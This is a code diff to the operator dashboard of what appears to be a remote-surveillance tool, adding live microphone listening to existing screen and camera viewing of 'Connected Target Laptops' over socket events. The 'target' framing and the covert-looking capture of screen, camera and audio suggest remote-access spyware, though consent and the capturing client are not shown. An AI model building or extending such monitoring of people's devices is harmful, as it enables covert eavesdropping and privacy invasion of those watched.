@@ -19,6 +19,7 @@
     <div id="controls" class="hidden" style="margin-top: 15px;">
         <button id="viewScreenBtn" style="background: #28a745;">🖥️ View Screen</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
+        <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
     </div>
     <video id="preview-video" autoplay muted playsinline class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #ffc107; border-radius: 8px; background: black;"></video>
     <img id="preview-img" class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #28a745; border-radius: 8px; background: black;">
@@ -76,17 +77,30 @@
             // until the admin explicitly clicks "View Screen" or "View Camera".
         }
 
-        // Toggle buttons logic
-        document.getElementById('viewScreenBtn').onclick = () => {
-            // Stop camera if it's running
-            if (activeType === 'camera') {
+        function stopCurrentActive() {
+            if (activeType === 'screen') {
+                socket.emit('stop-screen', activeTarget);
+                document.getElementById('preview-img').src = "";
+                document.getElementById('preview-img').classList.add('hidden');
+            } else if (activeType === 'camera') {
                 socket.emit('stop-camera', activeTarget);
                 if (peerConnection) peerConnection.close();
                 peerConnection = null;
                 document.getElementById('preview-video').srcObject = null;
                 document.getElementById('preview-video').classList.add('hidden');
+            } else if (activeType === 'mic') {
+                socket.emit('stop-mic', activeTarget);
+                if (peerConnection) peerConnection.close();
+                peerConnection = null;
+                document.getElementById('preview-video').srcObject = null;
+                document.getElementById('preview-video').classList.add('hidden');
             }
-            
+        }
+
+        // Toggle buttons logic
+        document.getElementById('viewScreenBtn').onclick = () => {
+            if (activeType === 'screen') return;
+            stopCurrentActive();
             activeType = 'screen';
             document.getElementById('preview-img').classList.remove('hidden');
             document.getElementById('title').innerText = "Viewing Screen: " + activeTarget;
@@ -94,17 +108,21 @@
         };
 
         document.getElementById('viewCameraBtn').onclick = () => {
-            // Stop screen if it's running
-            if (activeType === 'screen') {
-                socket.emit('stop-screen', activeTarget);
-                document.getElementById('preview-img').src = "";
-                document.getElementById('preview-img').classList.add('hidden');
-            }
-
+            if (activeType === 'camera') return;
+            stopCurrentActive();
             activeType = 'camera';
             document.getElementById('preview-video').classList.remove('hidden');
             document.getElementById('title').innerText = "Viewing Camera: " + activeTarget;
             socket.emit('request-camera', activeTarget);
+        };
+
+        document.getElementById('listenMicBtn').onclick = () => {
+            if (activeType === 'mic') return;
+            stopCurrentActive();
+            activeType = 'mic';
+            document.getElementById('preview-video').classList.remove('hidden'); // Can play audio too
+            document.getElementById('title').innerText = "Listening Mic: " + activeTarget;
+            socket.emit('request-mic', activeTarget);
         };
 
         document.getElementById('backBtn').onclick = () => {
@@ -115,17 +133,8 @@
             document.getElementById('backBtn').classList.add('hidden');
             document.getElementById('title').innerText = "Connected Target Laptops";
             
-            if (peerConnection) peerConnection.close();
-            peerConnection = null;
-            document.getElementById('preview-video').srcObject = null;
-            document.getElementById('preview-img').src = "";
+            stopCurrentActive();
             
-            if (activeType === 'screen') {
-                socket.emit('stop-screen', activeTarget);
-            } else if (activeType === 'camera') {
-                socket.emit('stop-camera', activeTarget);
-            }
-            // Also emit stop-watch just to be 100% safe
             socket.emit('stop-watch', activeTarget);
             activeTarget = null;
             activeType = null;
